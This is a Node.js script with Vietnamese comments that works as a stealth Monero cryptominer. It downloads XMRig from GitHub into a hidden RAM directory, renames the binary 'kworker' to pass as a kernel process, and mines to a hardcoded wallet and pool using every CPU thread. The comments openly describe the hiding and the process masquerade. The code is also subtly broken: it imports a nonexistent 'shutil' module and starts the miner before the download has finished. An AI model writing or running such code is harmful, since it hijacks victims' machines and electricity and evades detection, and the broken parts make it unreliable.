const https = require('https');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const os = require('os');
const tar = require('tar');
const shutil = require('shutil');

// ========= Cấu hình =========
const POOL = "pool.hashvault.pro:443";
const WALLET = "85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz";
const WORKER = `worker-${os.hostname()}`;
const CPU_THREADS = os.cpus().length;
const HIDDEN_DIR = '/dev/shm/.cache';  // Ẩn trong RAM, tự xóa khi reboot
const XMRIG_VERSION = '6.21.1';
const XMRIG_URL = `https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-x64.tar.gz`;
const FAKE_NAME = 'kworker';  // Tên giả mạo tiến trình

// ========= Hàm tải và giải nén =========
function downloadAndExtract() {
    if (!fs.existsSync(HIDDEN_DIR)) {
        fs.mkdirSync(HIDDEN_DIR, { recursive: true });
    }
    const tarPath = path.join(HIDDEN_DIR, '.core.tar.gz');
    
    https.get(XMRIG_URL, (response) => {
        const fileStream = fs.createWriteStream(tarPath);
        response.pipe(fileStream);
        fileStream.on('finish', () => {
            fileStream.close(() => {
                try {
                    // Giải nén
                    tar.x({
                        file: tarPath,
                        C: HIDDEN_DIR
                    }).then(() => {
                        fs.unlinkSync(tarPath);  // Xóa tệp .tar.gz sau khi giải nén
                        console.log('✅ XMRig đã được tải và giải nén.');
                    }).catch(err => {
                        console.error(`❌ Lỗi giải nén: ${err}`);
                        process.exit(1);
                    });
                } catch (err) {
                    console.error(`❌ Lỗi giải nén: ${err}`);
                    process.exit(1);
                }
            });
        });
    }).on('error', (err) => {
        console.error(`❌ Lỗi tải tệp: ${err}`);
        process.exit(1);
    });
}

// ========= Hàm khởi chạy ẩn =========
function runHidden() {
    const xmrigDir = fs.readdirSync(HIDDEN_DIR).find((dir) => dir.startsWith('xmrig-'));
    if (!xmrigDir) {
        console.log('❌ Không tìm thấy thư mục XMRig.');
        process.exit(1);
    }

    const realPath = path.join(HIDDEN_DIR, xmrigDir, 'xmrig');
    const fakePath = path.join(HIDDEN_DIR, FAKE_NAME);

    try {
        fs.copyFileSync(realPath, fakePath);
        fs.chmodSync(fakePath, '700');  // Set permissions for the file

        exec(`${fakePath} -o ${POOL} -u ${WALLET}.${WORKER} --coin monero --cpu-priority 3 --threads ${CPU_THREADS} --donate-level 1 --background`, (err, stdout, stderr) => {
            if (err) {
                console.error(`❌ Lỗi khi chạy XMRig: ${err}`);
                process.exit(1);
            }
            console.log(`✅ Đang đào Monero, tiến trình đang chạy ngầm.`);
        });
    } catch (err) {
        console.error(`❌ Lỗi khi chạy ẩn: ${err}`);
        process.exit(1);
    }
}

// ========= Main =========
function main() {
    downloadAndExtract();
    runHidden();
}

main();
